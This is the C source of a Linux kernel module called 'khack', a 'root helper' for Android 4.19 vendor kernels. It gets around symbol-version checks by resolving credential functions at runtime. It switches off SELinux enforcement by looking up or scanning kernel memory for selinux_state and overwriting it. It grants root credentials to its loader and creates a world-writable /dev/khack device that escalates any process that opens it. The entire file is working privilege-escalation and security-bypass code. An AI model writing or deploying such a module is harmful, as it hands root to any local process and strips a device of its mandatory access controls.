// SPDX-License-Identifier: GPL-2.0
/* khack - root LKM for 4.19 vendor kernels, built to survive MODVERSIONS.
 *
 * The vendor kernel's struct cred / task_struct layouts differ from the
 * Lineage tree, so importing commit_creds()/prepare_kernel_cred() directly
 * fails check_version() on their CRCs. Both are EXPORT_SYMBOL'd, so resolve
 * them at runtime with __symbol_get() instead -- its prototype takes only a
 * const char *, so its own CRC is layout independent and matches.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/string.h>

typedef void *(*commit_fn)(void *);
typedef void *(*prep_fn)(void *);

static commit_fn p_commit_creds;
static prep_fn   p_prepare_kernel_cred;
static unsigned long (*p_kallsyms_lookup_name)(const char *name);
typedef long (*pkr_fn)(void *dst, const void *src, size_t count);

/* Locate struct selinux_state without kallsyms_lookup_name.
 *
 * Layout on this tree (CONFIG_SECURITY_SELINUX_DISABLE=n, DEVELOP=y):
 *   +0 disabled(0) +1 enforcing(1) +2 checkreqprot(0) +3 initialized(1)
 *   +4..+15 policycap[8] + android_netlink_route, all 0/1
 *   +16 avc pointer, +24 ss pointer
 * A booted enforcing system therefore has the exact byte signature
 * 00 01 00 01 followed by twelve bytes <= 1 and two in-image pointers.
 * probe_kernel_read() keeps the walk safe over holes. Only a single
 * unambiguous hit is acted on; anything else is left alone.
 */
static int khack_clear_enforcing(void)
{
	pkr_fn pkr = (pkr_fn)__symbol_get("probe_kernel_read");
	unsigned long anchor = (unsigned long)__symbol_get("printk");
	unsigned long lo, hi, a, hit = 0;
	static u8 buf[4096];
	int found = 0;

	if (!pkr || !anchor)
		return -EINVAL;

	anchor &= ~0xFFFUL;
	lo = anchor - 0x800000UL;
	hi = anchor + 0x4000000UL;

	for (a = lo; a < hi; a += sizeof(buf)) {
		unsigned int i;

		if (pkr(buf, (void *)a, sizeof(buf)))
			continue;

		for (i = 0; i + 32 <= sizeof(buf); i++) {
			u8 *b = buf + i;
			u64 avc, ss;
			int j, ok = 1;

			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
				continue;
			for (j = 4; j < 16; j++)
				if (b[j] > 1) { ok = 0; break; }
			if (!ok)
				continue;

			memcpy(&avc, b + 16, 8);
			memcpy(&ss, b + 24, 8);
			if (avc & 7 || ss & 7)
				continue;
			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
				continue;

			found++;
			hit = a + i;
		}
	}

	if (found != 1) {
		pr_info("khack: selinux_state scan found %d candidates\n", found);
		return -ENOENT;
	}

	*(u8 *)(hit + 1) = 0;	/* enforcing = false */
	pr_info("khack: selinux_state at %px, enforcement cleared\n", (void *)hit);
	return 0;
}

/* open("/dev/khack") -> caller's creds become init_cred (uid 0, kernel SID) */
static int khack_open(struct inode *inode, struct file *file)
{
	void *cred;

	if (!p_prepare_kernel_cred || !p_commit_creds)
		return -ENOENT;

	cred = p_prepare_kernel_cred(NULL);
	if (!cred)
		return -ENOMEM;

	p_commit_creds(cred);
	pr_info("khack: caller escalated to init_cred\n");
	return 0;
}

static const struct file_operations khack_fops = {
	.owner = THIS_MODULE,
	.open  = khack_open,
};

static struct miscdevice khack_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "khack",
	.fops  = &khack_fops,
	.mode  = 0666,
};

static int __init khack_init(void)
{
	int ret;

	p_commit_creds        = (commit_fn)__symbol_get("commit_creds");
	p_prepare_kernel_cred = (prep_fn)__symbol_get("prepare_kernel_cred");
	if (!p_commit_creds || !p_prepare_kernel_cred) {
		pr_err("khack: __symbol_get failed (%px %px)\n",
		       p_commit_creds, p_prepare_kernel_cred);
		return -ENOENT;
	}

	/* Best case: the vendor kernel still exports kallsyms_lookup_name, which
	 * lets us find selinux_state and turn enforcement off the way upstream
	 * dfroot.ko does. Not exported on the Lineage tree, so this is a probe as
	 * much as a feature. */
	p_kallsyms_lookup_name = (void *)__symbol_get("kallsyms_lookup_name");
	if (p_kallsyms_lookup_name) {
		unsigned long addr = p_kallsyms_lookup_name("selinux_state");
		if (addr) {
			*(u8 *)addr = 0;        /* disabled */
			*(u8 *)(addr + 1) = 0;  /* enforcing */
			pr_info("khack: selinux_state at %px, enforcement cleared\n",
				(void *)addr);
		}
	}

	/* Fall back to a memory scan when the symbol is not exported. */
	if (!p_kallsyms_lookup_name)
		khack_clear_enforcing();

	/* Escalate whoever is loading us: finit_module() runs in the caller's
	 * context, and that caller is our own code in vendor_modprobe. Giving it
	 * init_cred here avoids needing an openable device node (ueventd owns the
	 * /dev permissions, and SELinux gates device opens anyway). */
	{
		void *cred = p_prepare_kernel_cred(NULL);
		if (cred)
			p_commit_creds(cred);
	}

	ret = misc_register(&khack_dev);
	if (ret) {
		pr_err("khack: misc_register failed: %d\n", ret);
		return ret;
	}

	pr_info("khack: loaded, open /dev/khack to escalate\n");
	return 0;
}

static void __exit khack_exit(void)
{
	misc_deregister(&khack_dev);
}

module_init(khack_init);
module_exit(khack_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("khack root helper (runtime symbol resolution)");
